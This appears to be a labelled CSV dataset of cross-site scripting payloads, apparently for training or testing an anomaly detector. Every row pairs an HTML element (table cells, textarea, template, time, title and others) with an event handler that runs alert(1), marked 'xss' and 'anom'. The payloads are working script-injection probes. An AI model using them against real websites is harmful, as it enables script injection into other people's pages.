payload,length,attack_type,label
"<table onmouseup=""alert(1)"">test</table>",40,xss,anom
"<table onpaste=""alert(1)"" contenteditable>test</table>",54,xss,anom
"<tbody draggable=""true"" ondrag=""alert(1)"">test</tbody>",54,xss,anom
"<tbody draggable=""true"" ondragend=""alert(1)"">test</tbody>",57,xss,anom
"<tbody draggable=""true"" ondragenter=""alert(1)"">test</tbody>",59,xss,anom
"<tbody draggable=""true"" ondragleave=""alert(1)"">test</tbody>",59,xss,anom
"<tbody draggable=""true"" ondragstart=""alert(1)"">test</tbody>",59,xss,anom
<tbody id=x tabindex=1 onactivate=alert(1)></tbody>,51,xss,anom
<tbody id=x tabindex=1 onbeforeactivate=alert(1)></tbody>,57,xss,anom
<tbody id=x tabindex=1 onbeforedeactivate=alert(1)></tbody><input autofocus>,76,xss,anom
<tbody id=x tabindex=1 ondeactivate=alert(1)></tbody><input id=y autofocus>,75,xss,anom
<tbody id=x tabindex=1 onfocus=alert(1)></tbody>,48,xss,anom
<tbody id=x tabindex=1 onfocusin=alert(1)></tbody>,50,xss,anom
"<tbody onbeforecopy=""alert(1)"" contenteditable>test</tbody>",59,xss,anom
"<tbody onbeforecut=""alert(1)"" contenteditable>test</tbody>",58,xss,anom
"<tbody onbeforepaste=""alert(1)"" contenteditable>test</tbody>",60,xss,anom
<tbody onblur=alert(1) tabindex=1 id=x></tbody><input autofocus>,64,xss,anom
"<tbody onclick=""alert(1)"">test</tbody>",38,xss,anom
"<tbody oncontextmenu=""alert(1)"">test</tbody>",44,xss,anom
"<tbody oncopy=""alert(1)"" contenteditable>test</tbody>",53,xss,anom
"<tbody oncut=""alert(1)"" contenteditable>test</tbody>",52,xss,anom
"<tbody ondblclick=""alert(1)"">test</tbody>",41,xss,anom
<tbody onfocusout=alert(1) tabindex=1 id=x></tbody><input autofocus>,68,xss,anom
"<tbody onkeydown=""alert(1)"" contenteditable>test</tbody>",56,xss,anom
"<tbody onkeypress=""alert(1)"" contenteditable>test</tbody>",57,xss,anom
"<tbody onkeyup=""alert(1)"" contenteditable>test</tbody>",54,xss,anom
"<tbody onmousedown=""alert(1)"">test</tbody>",42,xss,anom
"<tbody onmouseenter=""alert(1)"">test</tbody>",43,xss,anom
"<tbody onmouseleave=""alert(1)"">test</tbody>",43,xss,anom
"<tbody onmousemove=""alert(1)"">test</tbody>",42,xss,anom
"<tbody onmouseout=""alert(1)"">test</tbody>",41,xss,anom
"<tbody onmouseover=""alert(1)"">test</tbody>",42,xss,anom
"<tbody onmouseup=""alert(1)"">test</tbody>",40,xss,anom
"<tbody onpaste=""alert(1)"" contenteditable>test</tbody>",54,xss,anom
"<td draggable=""true"" ondrag=""alert(1)"">test</td>",48,xss,anom
"<td draggable=""true"" ondragend=""alert(1)"">test</td>",51,xss,anom
"<td draggable=""true"" ondragenter=""alert(1)"">test</td>",53,xss,anom
"<td draggable=""true"" ondragleave=""alert(1)"">test</td>",53,xss,anom
"<td draggable=""true"" ondragstart=""alert(1)"">test</td>",53,xss,anom
<td id=x tabindex=1 onactivate=alert(1)></td>,45,xss,anom
<td id=x tabindex=1 onbeforeactivate=alert(1)></td>,51,xss,anom
<td id=x tabindex=1 onbeforedeactivate=alert(1)></td><input autofocus>,70,xss,anom
<td id=x tabindex=1 ondeactivate=alert(1)></td><input id=y autofocus>,69,xss,anom
<td id=x tabindex=1 onfocus=alert(1)></td>,42,xss,anom
<td id=x tabindex=1 onfocusin=alert(1)></td>,44,xss,anom
"<td onbeforecopy=""alert(1)"" contenteditable>test</td>",53,xss,anom
"<td onbeforecut=""alert(1)"" contenteditable>test</td>",52,xss,anom
"<td onbeforepaste=""alert(1)"" contenteditable>test</td>",54,xss,anom
<td onblur=alert(1) tabindex=1 id=x></td><input autofocus>,58,xss,anom
"<td onclick=""alert(1)"">test</td>",32,xss,anom
"<td oncontextmenu=""alert(1)"">test</td>",38,xss,anom
"<td oncopy=""alert(1)"" contenteditable>test</td>",47,xss,anom
"<td oncut=""alert(1)"" contenteditable>test</td>",46,xss,anom
"<td ondblclick=""alert(1)"">test</td>",35,xss,anom
<td onfocusout=alert(1) tabindex=1 id=x></td><input autofocus>,62,xss,anom
"<td onkeydown=""alert(1)"" contenteditable>test</td>",50,xss,anom
"<td onkeypress=""alert(1)"" contenteditable>test</td>",51,xss,anom
"<td onkeyup=""alert(1)"" contenteditable>test</td>",48,xss,anom
"<td onmousedown=""alert(1)"">test</td>",36,xss,anom
"<td onmouseenter=""alert(1)"">test</td>",37,xss,anom
"<td onmouseleave=""alert(1)"">test</td>",37,xss,anom
"<td onmousemove=""alert(1)"">test</td>",36,xss,anom
"<td onmouseout=""alert(1)"">test</td>",35,xss,anom
"<td onmouseover=""alert(1)"">test</td>",36,xss,anom
"<td onmouseup=""alert(1)"">test</td>",34,xss,anom
"<td onpaste=""alert(1)"" contenteditable>test</td>",48,xss,anom
"<template draggable=""true"" ondrag=""alert(1)"">test</template>",60,xss,anom
"<template draggable=""true"" ondragend=""alert(1)"">test</template>",63,xss,anom
"<template draggable=""true"" ondragenter=""alert(1)"">test</template>",65,xss,anom
"<template draggable=""true"" ondragleave=""alert(1)"">test</template>",65,xss,anom
"<template draggable=""true"" ondragstart=""alert(1)"">test</template>",65,xss,anom
<template id=x tabindex=1 onactivate=alert(1)></template>,57,xss,anom
<template id=x tabindex=1 onbeforeactivate=alert(1)></template>,63,xss,anom
<template id=x tabindex=1 onbeforedeactivate=alert(1)></template><input autofocus>,82,xss,anom
<template id=x tabindex=1 ondeactivate=alert(1)></template><input id=y autofocus>,81,xss,anom
<template id=x tabindex=1 onfocus=alert(1)></template>,54,xss,anom
<template id=x tabindex=1 onfocusin=alert(1)></template>,56,xss,anom
"<template onbeforecopy=""alert(1)"" contenteditable>test</template>",65,xss,anom
"<template onbeforecut=""alert(1)"" contenteditable>test</template>",64,xss,anom
"<template onbeforepaste=""alert(1)"" contenteditable>test</template>",66,xss,anom
<template onblur=alert(1) tabindex=1 id=x></template><input autofocus>,70,xss,anom
"<template onclick=""alert(1)"">test</template>",44,xss,anom
"<template oncontextmenu=""alert(1)"">test</template>",50,xss,anom
"<template oncopy=""alert(1)"" contenteditable>test</template>",59,xss,anom
"<template oncut=""alert(1)"" contenteditable>test</template>",58,xss,anom
"<template ondblclick=""alert(1)"">test</template>",47,xss,anom
<template onfocusout=alert(1) tabindex=1 id=x></template><input autofocus>,74,xss,anom
"<template onkeydown=""alert(1)"" contenteditable>test</template>",62,xss,anom
"<template onkeypress=""alert(1)"" contenteditable>test</template>",63,xss,anom
"<template onkeyup=""alert(1)"" contenteditable>test</template>",60,xss,anom
"<template onmousedown=""alert(1)"">test</template>",48,xss,anom
"<template onmouseenter=""alert(1)"">test</template>",49,xss,anom
"<template onmouseleave=""alert(1)"">test</template>",49,xss,anom
"<template onmousemove=""alert(1)"">test</template>",48,xss,anom
"<template onmouseout=""alert(1)"">test</template>",47,xss,anom
"<template onmouseover=""alert(1)"">test</template>",48,xss,anom
"<template onmouseup=""alert(1)"">test</template>",46,xss,anom
"<template onpaste=""alert(1)"" contenteditable>test</template>",60,xss,anom
<textarea autofocus onfocus=alert(1)>test</textarea>,52,xss,anom
<textarea autofocus onfocusin=alert(1)>test</textarea>,54,xss,anom
"<textarea draggable=""true"" ondrag=""alert(1)"">test</textarea>",60,xss,anom
"<textarea draggable=""true"" ondragend=""alert(1)"">test</textarea>",63,xss,anom
"<textarea draggable=""true"" ondragenter=""alert(1)"">test</textarea>",65,xss,anom
"<textarea draggable=""true"" ondragleave=""alert(1)"">test</textarea>",65,xss,anom
"<textarea draggable=""true"" ondragstart=""alert(1)"">test</textarea>",65,xss,anom
<textarea id=x tabindex=1 onactivate=alert(1)></textarea>,57,xss,anom
<textarea id=x tabindex=1 onbeforeactivate=alert(1)></textarea>,63,xss,anom
<textarea id=x tabindex=1 onbeforedeactivate=alert(1)></textarea><input autofocus>,82,xss,anom
<textarea id=x tabindex=1 ondeactivate=alert(1)></textarea><input id=y autofocus>,81,xss,anom
<textarea onauxclick=alert(1)>XSS</textarea>,44,xss,anom
<textarea onbeforecopy=alert(1) autofocus>XSS</textarea>,56,xss,anom
<textarea onbeforecut=alert(1) autofocus>XSS</textarea>,55,xss,anom
<textarea onbeforepaste=alert(1) autofocus></textarea>,54,xss,anom
<textarea onblur=alert(1) id=x></textarea><input autofocus>,59,xss,anom
<textarea onchange=alert(1)>XSS</textarea>,42,xss,anom
"<textarea onclick=""alert(1)"">test</textarea>",44,xss,anom
"<textarea oncontextmenu=""alert(1)"">test</textarea>",50,xss,anom
<textarea oncopy=alert(1) autofocus>XSS</textarea>,50,xss,anom
<textarea oncut=alert(1) autofocus>XSS</textarea>,49,xss,anom
"<textarea ondblclick=""alert(1)"">test</textarea>",47,xss,anom
<textarea onfocusout=alert(1) id=x></textarea><input autofocus>,63,xss,anom
<textarea oninput=alert(1)>XSS</textarea>,41,xss,anom
"<textarea onkeydown=""alert(1)"" contenteditable>test</textarea>",62,xss,anom
"<textarea onkeypress=""alert(1)"" contenteditable>test</textarea>",63,xss,anom
"<textarea onkeyup=""alert(1)"" contenteditable>test</textarea>",60,xss,anom
"<textarea onmousedown=""alert(1)"">test</textarea>",48,xss,anom
"<textarea onmouseenter=""alert(1)"">test</textarea>",49,xss,anom
"<textarea onmouseleave=""alert(1)"">test</textarea>",49,xss,anom
"<textarea onmousemove=""alert(1)"">test</textarea>",48,xss,anom
"<textarea onmouseout=""alert(1)"">test</textarea>",47,xss,anom
"<textarea onmouseover=""alert(1)"">test</textarea>",48,xss,anom
"<textarea onmouseup=""alert(1)"">test</textarea>",46,xss,anom
<textarea onpaste=alert(1) autofocus></textarea>,48,xss,anom
<textarea onselect=alert(1) autofocus>XSS</textarea>,52,xss,anom
"<tfoot draggable=""true"" ondrag=""alert(1)"">test</tfoot>",54,xss,anom
"<tfoot draggable=""true"" ondragend=""alert(1)"">test</tfoot>",57,xss,anom
"<tfoot draggable=""true"" ondragenter=""alert(1)"">test</tfoot>",59,xss,anom
"<tfoot draggable=""true"" ondragleave=""alert(1)"">test</tfoot>",59,xss,anom
"<tfoot draggable=""true"" ondragstart=""alert(1)"">test</tfoot>",59,xss,anom
<tfoot id=x tabindex=1 onactivate=alert(1)></tfoot>,51,xss,anom
<tfoot id=x tabindex=1 onbeforeactivate=alert(1)></tfoot>,57,xss,anom
<tfoot id=x tabindex=1 onbeforedeactivate=alert(1)></tfoot><input autofocus>,76,xss,anom
<tfoot id=x tabindex=1 ondeactivate=alert(1)></tfoot><input id=y autofocus>,75,xss,anom
<tfoot id=x tabindex=1 onfocus=alert(1)></tfoot>,48,xss,anom
<tfoot id=x tabindex=1 onfocusin=alert(1)></tfoot>,50,xss,anom
"<tfoot onbeforecopy=""alert(1)"" contenteditable>test</tfoot>",59,xss,anom
"<tfoot onbeforecut=""alert(1)"" contenteditable>test</tfoot>",58,xss,anom
"<tfoot onbeforepaste=""alert(1)"" contenteditable>test</tfoot>",60,xss,anom
<tfoot onblur=alert(1) tabindex=1 id=x></tfoot><input autofocus>,64,xss,anom
"<tfoot onclick=""alert(1)"">test</tfoot>",38,xss,anom
"<tfoot oncontextmenu=""alert(1)"">test</tfoot>",44,xss,anom
"<tfoot oncopy=""alert(1)"" contenteditable>test</tfoot>",53,xss,anom
"<tfoot oncut=""alert(1)"" contenteditable>test</tfoot>",52,xss,anom
"<tfoot ondblclick=""alert(1)"">test</tfoot>",41,xss,anom
<tfoot onfocusout=alert(1) tabindex=1 id=x></tfoot><input autofocus>,68,xss,anom
"<tfoot onkeydown=""alert(1)"" contenteditable>test</tfoot>",56,xss,anom
"<tfoot onkeypress=""alert(1)"" contenteditable>test</tfoot>",57,xss,anom
"<tfoot onkeyup=""alert(1)"" contenteditable>test</tfoot>",54,xss,anom
"<tfoot onmousedown=""alert(1)"">test</tfoot>",42,xss,anom
"<tfoot onmouseenter=""alert(1)"">test</tfoot>",43,xss,anom
"<tfoot onmouseleave=""alert(1)"">test</tfoot>",43,xss,anom
"<tfoot onmousemove=""alert(1)"">test</tfoot>",42,xss,anom
"<tfoot onmouseout=""alert(1)"">test</tfoot>",41,xss,anom
"<tfoot onmouseover=""alert(1)"">test</tfoot>",42,xss,anom
"<tfoot onmouseup=""alert(1)"">test</tfoot>",40,xss,anom
"<tfoot onpaste=""alert(1)"" contenteditable>test</tfoot>",54,xss,anom
"<th draggable=""true"" ondrag=""alert(1)"">test</th>",48,xss,anom
"<th draggable=""true"" ondragend=""alert(1)"">test</th>",51,xss,anom
"<th draggable=""true"" ondragenter=""alert(1)"">test</th>",53,xss,anom
"<th draggable=""true"" ondragleave=""alert(1)"">test</th>",53,xss,anom
"<th draggable=""true"" ondragstart=""alert(1)"">test</th>",53,xss,anom
<th id=x tabindex=1 onactivate=alert(1)></th>,45,xss,anom
<th id=x tabindex=1 onbeforeactivate=alert(1)></th>,51,xss,anom
<th id=x tabindex=1 onbeforedeactivate=alert(1)></th><input autofocus>,70,xss,anom
<th id=x tabindex=1 ondeactivate=alert(1)></th><input id=y autofocus>,69,xss,anom
<th id=x tabindex=1 onfocus=alert(1)></th>,42,xss,anom
<th id=x tabindex=1 onfocusin=alert(1)></th>,44,xss,anom
"<th onbeforecopy=""alert(1)"" contenteditable>test</th>",53,xss,anom
"<th onbeforecut=""alert(1)"" contenteditable>test</th>",52,xss,anom
"<th onbeforepaste=""alert(1)"" contenteditable>test</th>",54,xss,anom
<th onblur=alert(1) tabindex=1 id=x></th><input autofocus>,58,xss,anom
"<th onclick=""alert(1)"">test</th>",32,xss,anom
"<th oncontextmenu=""alert(1)"">test</th>",38,xss,anom
"<th oncopy=""alert(1)"" contenteditable>test</th>",47,xss,anom
"<th oncut=""alert(1)"" contenteditable>test</th>",46,xss,anom
"<th ondblclick=""alert(1)"">test</th>",35,xss,anom
<th onfocusout=alert(1) tabindex=1 id=x></th><input autofocus>,62,xss,anom
"<th onkeydown=""alert(1)"" contenteditable>test</th>",50,xss,anom
"<th onkeypress=""alert(1)"" contenteditable>test</th>",51,xss,anom
"<th onkeyup=""alert(1)"" contenteditable>test</th>",48,xss,anom
"<th onmousedown=""alert(1)"">test</th>",36,xss,anom
"<th onmouseenter=""alert(1)"">test</th>",37,xss,anom
"<th onmouseleave=""alert(1)"">test</th>",37,xss,anom
"<th onmousemove=""alert(1)"">test</th>",36,xss,anom
"<th onmouseout=""alert(1)"">test</th>",35,xss,anom
"<th onmouseover=""alert(1)"">test</th>",36,xss,anom
"<th onmouseup=""alert(1)"">test</th>",34,xss,anom
"<th onpaste=""alert(1)"" contenteditable>test</th>",48,xss,anom
"<thead draggable=""true"" ondrag=""alert(1)"">test</thead>",54,xss,anom
"<thead draggable=""true"" ondragend=""alert(1)"">test</thead>",57,xss,anom
"<thead draggable=""true"" ondragenter=""alert(1)"">test</thead>",59,xss,anom
"<thead draggable=""true"" ondragleave=""alert(1)"">test</thead>",59,xss,anom
"<thead draggable=""true"" ondragstart=""alert(1)"">test</thead>",59,xss,anom
<thead id=x tabindex=1 onactivate=alert(1)></thead>,51,xss,anom
<thead id=x tabindex=1 onbeforeactivate=alert(1)></thead>,57,xss,anom
<thead id=x tabindex=1 onbeforedeactivate=alert(1)></thead><input autofocus>,76,xss,anom
<thead id=x tabindex=1 ondeactivate=alert(1)></thead><input id=y autofocus>,75,xss,anom
<thead id=x tabindex=1 onfocus=alert(1)></thead>,48,xss,anom
<thead id=x tabindex=1 onfocusin=alert(1)></thead>,50,xss,anom
"<thead onbeforecopy=""alert(1)"" contenteditable>test</thead>",59,xss,anom
"<thead onbeforecut=""alert(1)"" contenteditable>test</thead>",58,xss,anom
"<thead onbeforepaste=""alert(1)"" contenteditable>test</thead>",60,xss,anom
<thead onblur=alert(1) tabindex=1 id=x></thead><input autofocus>,64,xss,anom
"<thead onclick=""alert(1)"">test</thead>",38,xss,anom
"<thead oncontextmenu=""alert(1)"">test</thead>",44,xss,anom
"<thead oncopy=""alert(1)"" contenteditable>test</thead>",53,xss,anom
"<thead oncut=""alert(1)"" contenteditable>test</thead>",52,xss,anom
"<thead ondblclick=""alert(1)"">test</thead>",41,xss,anom
<thead onfocusout=alert(1) tabindex=1 id=x></thead><input autofocus>,68,xss,anom
"<thead onkeydown=""alert(1)"" contenteditable>test</thead>",56,xss,anom
"<thead onkeypress=""alert(1)"" contenteditable>test</thead>",57,xss,anom
"<thead onkeyup=""alert(1)"" contenteditable>test</thead>",54,xss,anom
"<thead onmousedown=""alert(1)"">test</thead>",42,xss,anom
"<thead onmouseenter=""alert(1)"">test</thead>",43,xss,anom
"<thead onmouseleave=""alert(1)"">test</thead>",43,xss,anom
"<thead onmousemove=""alert(1)"">test</thead>",42,xss,anom
"<thead onmouseout=""alert(1)"">test</thead>",41,xss,anom
"<thead onmouseover=""alert(1)"">test</thead>",42,xss,anom
"<thead onmouseup=""alert(1)"">test</thead>",40,xss,anom
"<thead onpaste=""alert(1)"" contenteditable>test</thead>",54,xss,anom
"<time draggable=""true"" ondrag=""alert(1)"">test</time>",52,xss,anom
"<time draggable=""true"" ondragend=""alert(1)"">test</time>",55,xss,anom
"<time draggable=""true"" ondragenter=""alert(1)"">test</time>",57,xss,anom
"<time draggable=""true"" ondragleave=""alert(1)"">test</time>",57,xss,anom
"<time draggable=""true"" ondragstart=""alert(1)"">test</time>",57,xss,anom
<time id=x tabindex=1 onactivate=alert(1)></time>,49,xss,anom
<time id=x tabindex=1 onbeforeactivate=alert(1)></time>,55,xss,anom
<time id=x tabindex=1 onbeforedeactivate=alert(1)></time><input autofocus>,74,xss,anom
<time id=x tabindex=1 ondeactivate=alert(1)></time><input id=y autofocus>,73,xss,anom
<time id=x tabindex=1 onfocus=alert(1)></time>,46,xss,anom
<time id=x tabindex=1 onfocusin=alert(1)></time>,48,xss,anom
"<time onbeforecopy=""alert(1)"" contenteditable>test</time>",57,xss,anom
"<time onbeforecut=""alert(1)"" contenteditable>test</time>",56,xss,anom
"<time onbeforepaste=""alert(1)"" contenteditable>test</time>",58,xss,anom
<time onblur=alert(1) tabindex=1 id=x></time><input autofocus>,62,xss,anom
"<time onclick=""alert(1)"">test</time>",36,xss,anom
"<time oncontextmenu=""alert(1)"">test</time>",42,xss,anom
"<time oncopy=""alert(1)"" contenteditable>test</time>",51,xss,anom
"<time oncut=""alert(1)"" contenteditable>test</time>",50,xss,anom
"<time ondblclick=""alert(1)"">test</time>",39,xss,anom
<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>,66,xss,anom
"<time onkeydown=""alert(1)"" contenteditable>test</time>",54,xss,anom
"<time onkeypress=""alert(1)"" contenteditable>test</time>",55,xss,anom
"<time onkeyup=""alert(1)"" contenteditable>test</time>",52,xss,anom
"<time onmousedown=""alert(1)"">test</time>",40,xss,anom
"<time onmouseenter=""alert(1)"">test</time>",41,xss,anom
"<time onmouseleave=""alert(1)"">test</time>",41,xss,anom
"<time onmousemove=""alert(1)"">test</time>",40,xss,anom
"<time onmouseout=""alert(1)"">test</time>",39,xss,anom
"<time onmouseover=""alert(1)"">test</time>",40,xss,anom
"<time onmouseup=""alert(1)"">test</time>",38,xss,anom
"<time onpaste=""alert(1)"" contenteditable>test</time>",52,xss,anom
"<title draggable=""true"" ondrag=""alert(1)"">test</title>",54,xss,anom
"<title draggable=""true"" ondragend=""alert(1)"">test</title>",57,xss,anom
"<title draggable=""true"" ondragenter=""alert(1)"">test</title>",59,xss,anom
"<title draggable=""true"" ondragleave=""alert(1)"">test</title>",59,xss,anom
"<title draggable=""true"" ondragstart=""alert(1)"">test</title>",59,xss,anom
